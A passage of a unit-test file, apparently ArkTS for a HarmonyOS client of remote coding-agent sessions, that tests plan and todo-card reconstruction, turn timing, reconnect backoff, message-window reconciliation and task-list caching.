      const resultData: Record<string, Object> = {};
      resultData['toolUseId'] = 'same-use';
      const resultEvent: Record<string, Object> = {};
      resultEvent['type'] = 'tool_result';
      resultEvent['data'] = resultData;
      store.handleMakerEvent('same-session', resultEvent);

      const messages = store.getMessagesWithStreaming('same-session');
      let useCount = 0;
      let resultCount = 0;
      for (let i = 0; i < messages.length; i++) {
        if (messages[i].role === 'tool_use' && messages[i].toolUseId === 'same-use') useCount += 1;
        if (messages[i].role === 'tool_result' && messages[i].toolUseId === 'same-use') resultCount += 1;
      }
      expect(useCount).assertEqual(1);
      expect(resultCount).assertEqual(1);
      const items = buildRenderItems(messages, true);
      const work = items[0] as RenderWorkGroupItem;
      const group = work.children[0] as RenderToolGroupItem;
      expect(group.tools.length).assertEqual(1);
      expect(group.tools[0].hasResult).assertEqual(true);
    });

    it('keepsTheTerminalPlanSnapshotWhenTheInitialDatabaseRowArrivesLate', 0, () => {
      const store = new MessageStore();
      const initialStep: Record<string, Object> = {};
      initialStep['step'] = '已经完成的步骤';
      initialStep['status'] = 'in_progress';
      const pendingStep: Record<string, Object> = {};
      pendingStep['step'] = '确实没有完成的步骤';
      pendingStep['status'] = 'pending';
      const initialInput: Record<string, Object> = {};
      initialInput['plan'] = [initialStep, pendingStep];
      const liveData: Record<string, Object> = {};
      liveData['toolUseId'] = 'plan:turn-late-row';
      liveData['toolName'] = 'update_plan';
      liveData['input'] = initialInput;
      const liveEvent: Record<string, Object> = {};
      liveEvent['type'] = 'tool_use';
      liveEvent['source'] = 'codex';
      liveEvent['data'] = liveData;
      store.handleMakerEvent('late-plan-session', liveEvent, 'persisted-plan-row');

      const completedStep: Record<string, Object> = {};
      completedStep['step'] = '已经完成的步骤';
      completedStep['status'] = 'completed';
      const finalPendingStep: Record<string, Object> = {};
      finalPendingStep['step'] = '确实没有完成的步骤';
      finalPendingStep['status'] = 'pending';
      const raw: Record<string, Object> = {};
      raw['id'] = 'turn-late-row';
      raw['status'] = 'completed';
      const doneData: Record<string, Object> = {};
      doneData['raw'] = raw;
      doneData['plan'] = [completedStep, finalPendingStep];
      doneData['planUpdatedAtMs'] = 1_700_000_000_000;
      const doneEvent: Record<string, Object> = {};
      doneEvent['type'] = 'done';
      doneEvent['source'] = 'codex';
      doneEvent['data'] = doneData;
      store.handleMakerEvent('late-plan-session', doneEvent);

      // Desktop 的异步 DB create 仍可能携带首次 0/N 快照；overlay 必须保留 done 真相。
      const staleContent: Record<string, Object> = {};
      staleContent['toolUseId'] = 'plan:turn-late-row';
      staleContent['toolName'] = 'update_plan';
      staleContent['input'] = initialInput;
      const staleMessage: Record<string, Object> = {};
      staleMessage['id'] = 'persisted-plan-row';
      staleMessage['clientId'] = 'persisted-plan-row';
      staleMessage['sessionId'] = 'late-plan-session';
      staleMessage['role'] = 'tool_use';
      staleMessage['toolUseId'] = 'plan:turn-late-row';
      staleMessage['content'] = staleContent;
      const push: Record<string, Object> = {};
      push['sessionId'] = 'late-plan-session';
      push['message'] = staleMessage;
      store.handleSessionPush('device-1', 'local-db:messages:created', push);

      const rows = store.getMessages('late-plan-session');
      const planRow = rows.find((row: RemoteMessage) =>
        row.role === 'tool_use' && row.toolUseId === 'plan:turn-late-row');
      expect(planRow !== undefined).assertEqual(true);
      expect(planRowSealed(planRow)).assertEqual(true);
      const insertions = findTodoPlanInsertions(planRow === undefined ? [] : [planRow]);
      const insertion = insertions.get(0);
      expect(insertion?.todos.length).assertEqual(2);
      expect(insertion?.todos[0].status).assertEqual('completed');
      // 会话正常结束不等于所有步骤都完成，必须保留 done.plan 的真实 pending。
      expect(insertion?.todos[1].status).assertEqual('pending');
    });

    it('reconstructsTaskCreateAndTaskUpdateIntoOnePlanSession', 0, () => {
      const createInput: Record<string, Object> = {};
      createInput['subject'] = '检查鸿蒙工作步骤';
      const updateInput: Record<string, Object> = {};
      updateInput['taskId'] = '42';
      updateInput['status'] = 'completed';
      const create = planToolMessage('task-create', 'TaskCreate', createInput, 'create-use');
      const result = planToolResult(
        'task-created', 'create-use', 'Task #42 created successfully: 检查鸿蒙工作步骤');
      const update = planToolMessage('task-update', 'TaskUpdate', updateInput, 'update-use');
      const insertions = findTodoPlanInsertions([create, result, update]);

      expect(insertions.size).assertEqual(1);
      expect(insertions.get(2)?.key).assertEqual('todo-task-create');
      expect(insertions.get(2)?.todos[0].content).assertEqual('检查鸿蒙工作步骤');
      expect(insertions.get(2)?.todos[0].status).assertEqual('completed');
    });

    it('startsANewPlanSessionAcrossRealUserBoundaries', 0, () => {
      const firstStep: Record<string, Object> = {};
      firstStep['step'] = '读取代码';
      firstStep['status'] = 'in_progress';
      const firstInput: Record<string, Object> = {};
      firstInput['plan'] = [firstStep];
      const completedStep: Record<string, Object> = {};
      completedStep['step'] = '读取代码';
      completedStep['status'] = 'completed';
      const completedInput: Record<string, Object> = {};
      completedInput['plan'] = [completedStep];
      const first = planToolMessage('plan-first', 'update_plan', firstInput, 'plan-use-1');
      const ordinaryInput: Record<string, Object> = {};
      ordinaryInput['command'] = 'git status';
      const ordinary = planToolMessage('ordinary-tool', 'Bash', ordinaryInput, 'bash-use');
      const second = planToolMessage('plan-second', 'update_plan', completedInput, 'plan-use-2');
      const insertions = findTodoPlanInsertions([
        first, userBoundary('user-between'), ordinary, second,
      ]);

      expect(insertions.size).assertEqual(2);
      expect(insertions.get(0)?.key).assertEqual('todo-plan-first');
      expect(insertions.get(3)?.key).assertEqual('todo-plan-second');
      expect(insertions.get(3)?.todos[0].status).assertEqual('completed');
    });

    it('anchorsCompletedWorkDurationToTheTurnUserMessage', 0, () => {
      // 用户 10:00:00 发送，首个动作 10:00:08 才出现，正文 10:00:20 收口。
      // 时长必须含发送后的 8 秒等待（20s），不能从首个动作起算（12s）。
      const user = new RemoteMessage();
      user.id = 'turn-user';
      user.clientId = 'turn-user';
      user.role = 'user';
      user.content = '请修复登录问题';
      user.createdAt = '2026-08-20T10:00:00.000Z';

      const toolInput: Record<string, Object> = {};
      toolInput['command'] = 'git status';
      const tool = planToolMessage('turn-tool', 'Bash', toolInput, 'turn-tool-use');
      tool.createdAt = '2026-08-20T10:00:08.000Z';

      const answer = new RemoteMessage();
      answer.id = 'turn-answer';
      answer.clientId = 'turn-answer';
      answer.role = 'assistant';
      answer.content = '已经修复登录问题，原因是 token 过期未刷新。';
      answer.createdAt = '2026-08-20T10:00:20.000Z';
      answer.turnCompleted = true;

      const items = buildRenderItems([user, tool, answer], false);
      let work: RenderWorkGroupItem | undefined = undefined;
      for (let i = 0; i < items.length; i++) {
        if (items[i].type === 'work_group') work = items[i] as RenderWorkGroupItem;
      }
      expect(work !== undefined).assertEqual(true);
      expect(work?.startedAtMs).assertEqual(Date.parse('2026-08-20T10:00:00.000Z'));
      expect(work?.durationMs).assertEqual(20000);
    });

    it('fallsBackToFirstActivityWhenTheTurnBoundaryIsMissing', 0, () => {
      // 窗口截断：本轮用户消息不在窗口内，退回首个动作时间，不得凭空造出时长。
      const toolInput: Record<string, Object> = {};
      toolInput['command'] = 'git log';
      const tool = planToolMessage('orphan-tool', 'Bash', toolInput, 'orphan-tool-use');
      tool.createdAt = '2026-08-20T11:00:05.000Z';

      const answer = new RemoteMessage();
      answer.id = 'orphan-answer';
      answer.clientId = 'orphan-answer';
      answer.role = 'assistant';
      answer.content = '这是窗口截断后的第一段正文，内容足够长以便作为交付正文。';
      answer.createdAt = '2026-08-20T11:00:11.000Z';
      answer.turnCompleted = true;

      const items = buildRenderItems([tool, answer], false);
      let work: RenderWorkGroupItem | undefined = undefined;
      for (let i = 0; i < items.length; i++) {
        if (items[i].type === 'work_group') work = items[i] as RenderWorkGroupItem;
      }
      expect(work !== undefined).assertEqual(true);
      expect(work?.startedAtMs).assertEqual(Date.parse('2026-08-20T11:00:05.000Z'));
      expect(work?.durationMs).assertEqual(6000);
    });

    it('anchorsPlanOwnershipToTheSessionBoundaryNotItsMovingTail', 0, () => {
      // 回归：TaskUpdate 命中已有任务是同一份清单的合法续写，会把 session 的 lastIndex
      // 推到用户边界之后，但不得搬动所有权锚点。若用可变的 lastIndex 比较边界，
      // 后续 TaskCreate 会被吞进上一轮，长期未完成项持续吸走跨阶段的新任务。
      const createInput: Record<string, Object> = {};
      createInput['taskId'] = '1';
      createInput['subject'] = '上一轮长期任务';
      const create = planToolMessage('task-create-old', 'TaskCreate', createInput, 'use-create-old');

      const boundary = userBoundary('user-new-topic');

      // 新用户消息之后更新旧任务：exception 命中，session 继续，lastIndex 越过边界。
      const updateInput: Record<string, Object> = {};
      updateInput['taskId'] = '1';
      updateInput['status'] = 'in_progress';
      const update = planToolMessage('task-update-old', 'TaskUpdate', updateInput, 'use-update-old');

      // 新一轮的新任务：必须另起 session，不得续写上一轮。
      const newCreateInput: Record<string, Object> = {};
      newCreateInput['taskId'] = '2';
      newCreateInput['subject'] = '新一轮任务';
      const newCreate = planToolMessage('task-create-new', 'TaskCreate', newCreateInput, 'use-create-new');

      const insertions = findTodoPlanInsertions([create, boundary, update, newCreate]);
      expect(insertions.size).assertEqual(2);
      // 上一轮 session 收在越过边界的那次合法续写上。
      expect(insertions.get(2)?.key).assertEqual('todo-task-create-old');
      // 新任务另起 session，且只含自己的条目，没有把旧任务拼进来。
      expect(insertions.get(3)?.key).assertEqual('todo-task-create-new');
      expect(insertions.get(3)?.todos.length).assertEqual(1);
      expect(insertions.get(3)?.todos[0].content).assertEqual('新一轮任务');
    });

    it('keepsPlanOwnershipAcrossSteerAndSyntheticRows', 0, () => {      const step: Record<string, Object> = {};
      step['step'] = '继续执行';
      step['status'] = 'in_progress';
      const input: Record<string, Object> = {};
      input['plan'] = [step];
      const first = planToolMessage('plan-owner', 'update_plan', input, 'plan-owner-use');
      const steer = userBoundary('steer-row');
      steer.agentMeta['delivery'] = 'steer';
      const synthetic = userBoundary('resume-row');
      synthetic.isSyntheticTrigger = true;
      const second = planToolMessage('plan-update', 'update_plan', input, 'plan-update-use');
      const insertions = findTodoPlanInsertions([first, steer, synthetic, second]);
      expect(insertions.size).assertEqual(1);
      expect(insertions.get(3)?.key).assertEqual('todo-plan-owner');
    });

    it('doesNotLetSubagentPlansCompeteWithTheMainPlan', 0, () => {
      const step: Record<string, Object> = {};
      step['step'] = '主计划';
      step['status'] = 'in_progress';
      const input: Record<string, Object> = {};
      input['plan'] = [step];
      const main = planToolMessage('main-plan', 'update_plan', input, 'main-plan-use');
      const child = planToolMessage('child-plan', 'update_plan', input, 'child-plan-use');
      child.agentMeta['parentUuid'] = 'toolu_parent';
      const insertions = findTodoPlanInsertions([main, child]);
      expect(insertions.size).assertEqual(1);
      expect(insertions.get(0)?.key).assertEqual('todo-main-plan');
    });

    it('requiresEarlierHistoryForStatusOnlyTaskPlans', 0, () => {
      const boundary = userBoundary('task-owner');
      const updateInput: Record<string, Object> = {};
      updateInput['taskId'] = '42';
      updateInput['status'] = 'completed';
      const update = planToolMessage('task-update-only', 'TaskUpdate', updateInput, 'task-update-use');
      expect(latestTaskPlanWindowResolved([update], true)).assertEqual(false);
      expect(latestTaskPlanWindowResolved([boundary, update], true)).assertEqual(false);

      const createInput: Record<string, Object> = {};
      createInput['taskId'] = '42';
      createInput['subject'] = '完整任务';
      const create = planToolMessage('task-create-complete', 'TaskCreate', createInput, 'task-create-use');
      expect(latestTaskPlanWindowResolved([boundary, create, update], true)).assertEqual(true);
    });

    it('startsANewPlanSessionAfterThePreviousPlanCompletes', 0, () => {
      const doneStep: Record<string, Object> = {};
      doneStep['step'] = '完成旧计划';
      doneStep['status'] = 'completed';
      const doneInput: Record<string, Object> = {};
      doneInput['plan'] = [doneStep];
      const nextStep: Record<string, Object> = {};
      nextStep['step'] = '执行新计划';
      nextStep['status'] = 'in_progress';
      const nextInput: Record<string, Object> = {};
      nextInput['plan'] = [nextStep];
      const done = planToolMessage('plan-done', 'update_plan', doneInput, 'done-use');
      const next = planToolMessage('plan-next', 'update_plan', nextInput, 'next-use');
      const insertions = findTodoPlanInsertions([done, next]);

      expect(insertions.size).assertEqual(2);
      expect(insertions.get(0)?.key).assertEqual('todo-plan-done');
      expect(insertions.get(1)?.key).assertEqual('todo-plan-next');
    });

    it('doesNotMoveAStaleTaskPlanToAnAuthoritativeEmptyTaskList', 0, () => {
      const createInput: Record<string, Object> = {};
      createInput['subject'] = '旧任务';
      const create = planToolMessage('empty-create', 'TaskCreate', createInput, 'empty-create-use');
      const created = planToolResult(
        'empty-created', 'empty-create-use', 'Task #empty created successfully: 旧任务');
      const listInput: Record<string, Object> = {};
      const list = planToolMessage('empty-list', 'TaskList', listInput, 'empty-list-use');
      const empty = planToolResult('empty-result', 'empty-list-use', JSON.stringify({ tasks: [] }));
      const insertions = findTodoPlanInsertions([create, created, list, empty]);

      expect(insertions.size).assertEqual(1);
      expect(insertions.get(0)?.key).assertEqual('todo-empty-create');
      expect(insertions.get(2) === undefined).assertEqual(true);
    });

    it('matchesIdenticalTodoCardsByTheirPositionFromTheTail', 0, () => {
      const card = (key: string): RenderTodoCardItem => {
        const item = new RenderTodoCardItem();
        item.key = key;
        const first = new RenderTodoItem();
        first.content = '读取项目';
        const second = new RenderTodoItem();
        second.content = '完成修改';
        item.todos = [first, second];
        return item;
      };
      const previous = [card('old-earlier'), card('old-current')];
      const next = [card('new-oldest'), card('new-earlier'), card('new-current')];
      const signature = todoCardContentSignature(previous[1]);

      expect(todoCardRankFromTail(previous, 'old-current')).assertEqual(0);
      expect(todoCardIndexAtRankFromTail(next, signature, 0)).assertEqual(2);
      expect(todoCardRankFromTail(previous, 'old-earlier')).assertEqual(1);
      expect(todoCardIndexAtRankFromTail(next, signature, 1)).assertEqual(1);
    });

    it('classifiesOnlyRetryableNewSessionFailuresAsTransient', 0, () => {
      expect(isTransientNewSessionError(new Error('INVOKE_TIMEOUT'))).assertEqual(true);
      expect(isTransientNewSessionError(new Error('relay backpressure'))).assertEqual(true);
      expect(isTransientNewSessionError(new DlError('NOT_CONNECTED', 'not online'))).assertEqual(true);
      expect(isTransientNewSessionError(new DlError('BACKPRESSURE', 'buffer full'))).assertEqual(true);
      expect(isTransientNewSessionError(new DlError('CHANNEL_NOT_ALLOWED', 'timeout text')))
        .assertEqual(false);
      expect(isTransientNewSessionError(new Error('invalid working directory'))).assertEqual(false);
      expect(isTransientNewSessionError(undefined)).assertEqual(false);

      const cyclic: Record<string, Object> = {};
      cyclic['self'] = cyclic;
      expect(isTransientNewSessionError(cyclic)).assertEqual(false);
    });

    it('onlyReturnsNewSessionToEditAfterExactAbsence', 0, () => {
      const exact: Record<string, Object> = {};
      exact['id'] = 'session-1';
      const wrong: Record<string, Object> = {};
      wrong['id'] = 'session-other';
      expect(exactNewSessionRecord(exact, 'session-1') !== undefined).assertEqual(true);
      expect(exactNewSessionRecord(wrong, 'session-1') === undefined).assertEqual(true);
      expect(decideNewSessionRecoveryAction('edit', 'found')).assertEqual('resume');
      expect(decideNewSessionRecoveryAction('edit', 'missing')).assertEqual('edit');
      expect(decideNewSessionRecoveryAction('edit', 'unknown')).assertEqual('hold');
      expect(decideNewSessionRecoveryAction('retry', 'found')).assertEqual('resume');
      expect(decideNewSessionRecoveryAction('retry', 'missing')).assertEqual('create');
      expect(shouldBlockNewSessionRemoteOperation(false, 'running')).assertEqual(true);
      expect(shouldBlockNewSessionRemoteOperation(false, 'create-failed')).assertEqual(true);
      expect(shouldBlockNewSessionRemoteOperation(false, 'enqueue-failed')).assertEqual(false);
      expect(shouldBlockNewSessionRemoteOperation(true, '')).assertEqual(true);
    });

    it('derivesAndCollapsesAutoResumeCardsLikeMobile', 0, () => {
      expect(summarizeAutoResumeError(' API Error: timeout.\nsecond line'))
        .assertEqual('timeout.');
      const failedData: Record<string, Object> = {};
      failedData['live'] = true;
      failedData['error'] = 'API Error: relay unavailable';
      failedData['attempt'] = 2;
      failedData['maxAttempts'] = 3;
      failedData['sessionTotal'] = 4;
      failedData['outcome'] = 'failed';
      const failed = deriveAutoResumePresentation(failedData, true);
      expect(failed.state).assertEqual('failed');
      expect(failed.canExpand).assertEqual(true);

      const empty = deriveAutoResumePresentation({}, true);
      expect(empty.state).assertEqual('separator');

      const persistedInfo: Record<string, Object> = {};
      persistedInfo['outcome'] = 'succeeded';
      const persistedMeta: Record<string, Object> = {};
      persistedMeta['autoResume'] = true;
      persistedMeta['autoResumeInfo'] = persistedInfo;
      persistedMeta['autoResumeOutcome'] = 'invalid';
      const persistedRaw: Record<string, Object> = {};
      persistedRaw['id'] = 'persisted-resume';
      persistedRaw['role'] = 'user';
      persistedRaw['agentMeta'] = persistedMeta;
      const persisted = parseMessage(persistedRaw);
      expect(persisted.systemCardType).assertEqual('auto-resume');
      expect(persisted.systemCardData['outcome']).assertEqual('succeeded');

      const first = new RemoteMessage();
      first.id = 'resume-1';
      first.clientId = 'resume-client-1';
      first.role = 'user';
      first.systemCardType = 'auto-resume';
      first.isSyntheticTrigger = true;
      first.createdAt = '2026-08-01T00:00:01.000Z';
      const thinking = new RemoteMessage();
      thinking.id = 'thinking-empty';
      thinking.role = 'thinking';
      thinking.content = '  ';
      thinking.createdAt = '2026-08-01T00:00:02.000Z';
      const second = new RemoteMessage();
      second.id = 'resume-2';
      second.clientId = 'resume-client-2';
      second.role = 'user';
      second.systemCardType = 'auto-resume';
      second.systemCardData = failedData;
      second.isSyntheticTrigger = true;
      second.createdAt = '2026-08-01T00:00:03.000Z';
      const items = buildRenderItems(
        [first, thinking, second], true, undefined, false,
        'resume-client-2', 'supported', true);
      let visibleCards = 0;
      let inFlight = false;
      for (let i = 0; i < items.length; i++) {
        if (items[i].type !== 'message') continue;
        const item = items[i] as RenderMessageItem;
        if (item.message?.systemCardType === 'auto-resume') {
          visibleCards += 1;
          inFlight = item.autoResumeInFlight;
        }
      }
      expect(visibleCards).assertEqual(1);
      expect(inFlight).assertEqual(true);

      const pending: Record<string, Object> = {};
      pending['attempt'] = 1;
      const appended = appendAutoResumePendingMessage([second], pending);
      expect(appended.length).assertEqual(2);
      expect(appended[1].systemCardData['live']).assertEqual(true);
    });

    it('keepsCongestionCooldownAcrossShortReconnectsUntilTheLongStableWindow', 0, () => {
      const s = new ReconnectStability();
      const NORMAL = RECONNECT_STABLE_RESET_MS;
      const CONGESTION = RECONNECT_CONGESTION_STABLE_RESET_MS;
      expect(CONGESTION).assertEqual(900000);

      // 首次 1013：streak 累计，退避走拥塞下限。
      s.noteClosed(1013);
      expect(s.getCongestionStreak()).assertEqual(1);
      expect(s.nextReconnectDelayMs(1)).assertEqual(5000);

      // 短暂连接成功（只稳定 12 秒）：清普通退避，但**不得**清拥塞历史。
      s.noteOnline(0);
      let generation = s.getGeneration();
      expect(s.settleNormalWindow(generation, NORMAL)).assertEqual(true);
      expect(s.getAttempt()).assertEqual(0);
      expect(s.settleCongestionWindow(generation, 12000)).assertEqual(false);
      expect(s.getCongestionStreak()).assertEqual(1);

      // 再次 1013：按同一拥塞期继续累计并延长冷却。
      s.noteClosed(1013);
      expect(s.getCongestionStreak()).assertEqual(2);
      expect(s.nextReconnectDelayMs(1)).assertEqual(10000);

      // 连续稳定满 15 分钟后才清除 streak，随后不再吃拥塞下限。
      s.noteOnline(100000);
      generation = s.getGeneration();
      expect(s.settleCongestionWindow(generation, 100000 + CONGESTION - 1)).assertEqual(false);
      expect(s.settleCongestionWindow(generation, 100000 + CONGESTION)).assertEqual(true);
      expect(s.getCongestionStreak()).assertEqual(0);
      // 上一次成功只清了普通退避一次，attempt 此刻为 1 → 2^1 * 1000 = 2000，
      // 已回到普通指数退避（不再是 5000/10000 的拥塞下限）。
      expect(s.getAttempt()).assertEqual(1);
      expect(s.nextReconnectDelayMs(1)).assertEqual(2000);
      // 再稳定满普通窗即回到初始策略。
      s.noteOnline(200000);
      expect(s.settleNormalWindow(s.getGeneration(), 200000 + NORMAL)).assertEqual(true);
      expect(s.nextReconnectDelayMs(1)).assertEqual(1000);
    });

    it('ignoresStaleStabilityWindowsAndNonCongestionCloses', 0, () => {
      const s = new ReconnectStability();
      const CONGESTION = RECONNECT_CONGESTION_STABLE_RESET_MS;

      // 非 1013 关闭不得伪装成拥塞：正常关闭、鉴权失败、网络切换都只走普通退避。
      s.noteClosed(1000);
      s.noteClosed(1006);
      s.noteClosed(4401);
      expect(s.getCongestionStreak()).assertEqual(0);

      // 计时器竞态：登记稳定窗后连接断开，旧代次的结算必须作废，
      // 不能在新连接上清掉当前退避或拥塞状态。
      s.noteClosed(1013);
      s.noteOnline(0);
      const staleGeneration = s.getGeneration();
      s.noteClosed(1013);
      expect(s.getCongestionStreak()).assertEqual(2);
      expect(s.settleCongestionWindow(staleGeneration, CONGESTION * 10)).assertEqual(false);
      expect(s.settleNormalWindow(staleGeneration, CONGESTION * 10)).assertEqual(false);
      expect(s.getCongestionStreak()).assertEqual(2);

      // 当前代次但尚未在线（仍在重连中）：稳定窗不得结算。
      const current = s.getGeneration();
      expect(s.settleCongestionWindow(current, CONGESTION * 10)).assertEqual(false);

      // 显式重置推进代次并清空两项状态，旧计时器随之失效。
      s.noteOnline(0);
      const beforeReset = s.getGeneration();
      s.reset();
      expect(s.getCongestionStreak()).assertEqual(0);
      expect(s.settleNormalWindow(beforeReset, CONGESTION)).assertEqual(false);
    });

    it('appliesCongestionBackoffAndExpandsMakerEventBatches', 0, () => {
      expect(computeReconnectDelayMs(0, 1, 1)).assertEqual(5000);
      expect(computeReconnectDelayMs(0, 2, 1)).assertEqual(10000);
      expect(computeReconnectDelayMs(0, 1, 0)).assertEqual(3500);
      expect(computeReconnectDelayMs(8, 8, 1)).assertEqual(30000);

      const first: Record<string, Object> = {};
      first['sessionId'] = 's1';
      first['event'] = 'one';
      const bad: Record<string, Object> = {};
      bad['sessionId'] = 's2';
      const second: Record<string, Object> = {};
      second['sessionId'] = 's1';
      second['event'] = 'two';
      const batch: Record<string, Object> = {};
      batch['sessionId'] = 's1';
      batch['events'] = [first, bad, 'broken', second];
      const expanded = expandMakerEventBatchPayload(batch);
      expect(expanded.length).assertEqual(2);
      expect(expanded[0]['event']).assertEqual('one');
      expect(expanded[1]['event']).assertEqual('two');
    });

    it('sizesMarkdownTablesForContentAndAvailablePane', 0, () => {
      const header = [tokenizeInline('Name'), tokenizeInline('状态')];
      const rows = [[tokenizeInline('Cindy'), tokenizeInline('Ready')]];
      const shortWidths = buildMarkdownTableColumnWidths(header, rows, 112, 220, 400);
      expect(shortWidths.length).assertEqual(2);
      expect(shortWidths[0] + shortWidths[1]).assertEqual(400);

      const unevenRows = [[tokenizeInline('one'), tokenizeInline('two'), tokenizeInline('three')]];
      const uneven = buildMarkdownTableColumnWidths(header, unevenRows, 96, 220, 0);
      expect(uneven.length).assertEqual(3);
      expect(uneven[2] >= 96).assertEqual(true);

      const wideHeader = [tokenizeInline('A'.repeat(80)), tokenizeInline('B'.repeat(80))];
      const wide = buildMarkdownTableColumnWidths(wideHeader, [], 112, 220, 280);
      expect(wide[0]).assertEqual(220);
      expect(wide[1]).assertEqual(220);
    });

    it('keepsOnlyContinuousHistoryAcrossLatestWindowRefresh', 0, () => {
      const make = (id: string, second: number): RemoteMessage => {
        const message = new RemoteMessage();
        message.id = id;
        message.role = 'assistant';
        message.content = id;
        message.createdAt = `2026-08-01T00:00:0${second}.000Z`;
        return message;
      };
      const old1 = make('old-1', 1);
      const old2 = make('old-2', 2);
      const overlap = make('overlap', 3);
      const newest = make('newest', 4);
      const unverified = reconcileLatestMessageWindow(
        [old1, old2, overlap], [overlap, newest], true, null, false);
      expect(unverified.items.length).assertEqual(2);

      const coverage = new MessageWindowCoverage();
      coverage.since = Date.parse(old1.createdAt);
      coverage.until = Date.parse(overlap.createdAt);
      const verified = reconcileLatestMessageWindow(
        [old1, old2, overlap], [overlap, newest], true, coverage, true);
      expect(verified.items.length).assertEqual(4);
      expect(verified.coverage?.liveTailTrusted).assertEqual(true);

      const unknownInside = make('unknown-inside', 2);
      const invalidated = reconcileLatestMessageWindow(
        [old1, old2, overlap], [unknownInside, overlap, newest], true, coverage, false);
      expect(invalidated.items.length).assertEqual(3);

      const local = make('harmony-system-local', 1);
      const tail = make('live-tail', 5);
      const preserved = reconcileLatestMessageWindow(
        [old1, overlap, local, tail], [overlap, newest], true, null, false);
      let hasLocal = false;
      let hasTail = false;
      for (let i = 0; i < preserved.items.length; i++) {
        if (preserved.items[i].id === local.id) hasLocal = true;
        if (preserved.items[i].id === tail.id) hasTail = true;
      }
      expect(hasLocal).assertEqual(true);
      expect(hasTail).assertEqual(true);

      const sameTimestampTail = make('same-time-tail', 4);
      const sameTimestamp = reconcileLatestMessageWindow(
        [overlap, sameTimestampTail], [overlap, newest], true, null, false);
      let hasSameTimestampTail = false;
      for (let i = 0; i < sameTimestamp.items.length; i++) {
        if (sameTimestamp.items[i].id === sameTimestampTail.id) hasSameTimestampTail = true;
      }
      expect(hasSameTimestampTail).assertEqual(true);
      expect(sameTimestamp.items.length).assertEqual(3);
    });

    it('clearsStaleHistoryOnAuthoritativeEmptyPageAndKeepsLocalTail', 0, () => {
      const stale = new RemoteMessage();
      stale.id = 'stale';
      stale.role = 'assistant';
      stale.createdAt = '2026-08-01T00:00:01.000Z';
      const local = new RemoteMessage();
      local.id = 'harmony-system-local';
      local.role = 'system';
      local.createdAt = '2026-08-01T00:00:02.000Z';
      const streaming = new RemoteMessage();
      streaming.id = 'streaming';
      streaming.role = 'assistant';
      streaming.isStreaming = true;
      streaming.createdAt = '2026-08-01T00:00:03.000Z';
      const result = reconcileLatestMessageWindow([stale, local, streaming], [], false, null, false);
      expect(result.items.length).assertEqual(2);
      expect(result.items[0].id).assertEqual(local.id);
      expect(result.items[1].id).assertEqual(streaming.id);
      expect(result.coverage === null).assertEqual(true);
    });

    it('establishesCoverageWhenLoadingOlderWithoutPreviousCoverage', 0, () => {
      const older = new RemoteMessage();
      older.id = 'older';
      older.createdAt = '2026-08-01T00:00:01.000Z';
      const joinsAt = new RemoteMessage();
      joinsAt.id = 'join';
      joinsAt.createdAt = '2026-08-01T00:00:03.000Z';
      const coverage = extendCoverageEarlier(null, [older], joinsAt);
      expect(coverage !== null).assertEqual(true);
      expect(coverage?.since).assertEqual(Date.parse(older.createdAt));
      expect(coverage?.until).assertEqual(Date.parse(joinsAt.createdAt));
    });

    it('preservesPendingLocalCreationAcrossAuthoritativeSessionPatch', 0, () => {
      const store = new TaskStore();
      const session = new RemoteSession();
      session.id = 'pending-session';
      session.pendingLocalCreation = true;
      store.upsertSession('device-1', session);
      const patch: Record<string, Object> = {};
      patch['title'] = 'Authoritative title';
      const payload: Record<string, Object> = {};
      payload['sessionId'] = session.id;
      payload['patch'] = patch;
      store.handleSessionsPush('device-1', DlChannels.SESSIONS_PATCHED, payload);
      const updated = store.getSessions('device-1')[0];
      expect(updated.title).assertEqual('Authoritative title');
      expect(updated.pendingLocalCreation).assertEqual(true);
    });

    it('removesDeletedSessionFromTaskProjectionOnPatchPush', 0, () => {
      const store = new TaskStore();
      const session = new RemoteSession();
      session.id = 'deleted-session';
      session.title = '待删除任务';
      store.upsertSession('device-1', session);
      const patch: Record<string, Object> = {};
      patch['status'] = 'deleted';
      const payload: Record<string, Object> = {};
      payload['sessionId'] = session.id;
      payload['patch'] = patch;
      store.handleSessionsPush('device-1', DlChannels.SESSIONS_PATCHED, payload);
      expect(store.getSessions('device-1').length).assertEqual(0);
    });

    it('keepsCreatedSessionInTheListWhenStartingPostCreateReconciliation', 0, () => {
      const store = new TaskStore();
      const session = new RemoteSession();
      session.id = 'new-project-session';
      session.workspaceKind = 'project';
      session.workingDir = '/workspace/cindy';
      session.pendingLocalCreation = true;
      store.upsertSession('device-1', session);

      // 未 attach client 时列表刷新会安全失败；成功收口仍必须保留本地行并解除创建锁。
      store.completeLocalCreation('device-1', session.id);

      const sessions = store.getSessions('device-1');
      expect(sessions.length).assertEqual(1);
      expect(sessions[0].id).assertEqual(session.id);
      expect(sessions[0].pendingLocalCreation).assertEqual(false);
    });

    it('roundTripsAWhitelistedTaskListStartupSnapshot', 0, () => {
      const device = new CachedTaskListDevice();
      device.deviceId = 'desktop-1';
      device.deviceName = 'Office Mac';
      const session = new RemoteSession();
      session.id = 'session-1';
      session.title = 'A'.repeat(300);
      session.workingDir = '/workspace/cindy';
      session.status = 'active';
      session.agentKind = 'codex';
      session.createdAt = '2026-08-10T01:00:00.000Z';
      session.updatedAt = '2026-08-10T02:00:00.000Z';
      session.preview = 'cached preview';
      device.sessions = [session];

      const serialized = serializeTaskListSnapshot('account-1', [device]);
      expect(serialized !== null && serialized.length > 0).assertEqual(true);
      const restored = parseTaskListSnapshot(serialized ?? '', 'account-1');
      expect(restored.length).assertEqual(1);
      expect(restored[0].deviceId).assertEqual('desktop-1');
      expect(restored[0].sessions.length).assertEqual(1);
      expect(restored[0].sessions[0].title.length).assertEqual(240);
      expect(restored[0].sessions[0].workingDir).assertEqual('/workspace/cindy');
      expect(restored[0].sessions[0].preview).assertEqual('cached preview');
      expect(parseTaskListSnapshot(serialized ?? '', 'account-2').length).assertEqual(0);
    });

    it('showsCachedTasksImmediatelyButLetsTheServerRemoveGhostDevices', 0, () => {
      const cached = new CachedTaskListDevice();
      cached.deviceId = 'desktop-stale';
      cached.deviceName = 'Last known desktop';
      const session = new RemoteSession();
      session.id = 'cached-session';
      session.status = 'active';
      session.createdAt = '2026-08-10T01:00:00.000Z';
      cached.sessions = [session];
      const store = new TaskStore();

      store.hydrateTaskListSnapshot([cached]);
      expect(store.deviceList.length).assertEqual(1);
      expect(store.deviceList[0].online).assertEqual(false);
      expect(store.getSessions('desktop-stale').length).assertEqual(1);

      store.mergeServerDevices([]);
      expect(store.deviceList.length).assertEqual(0);
      expect(store.getSessions('desktop-stale').length).assertEqual(0);
    });

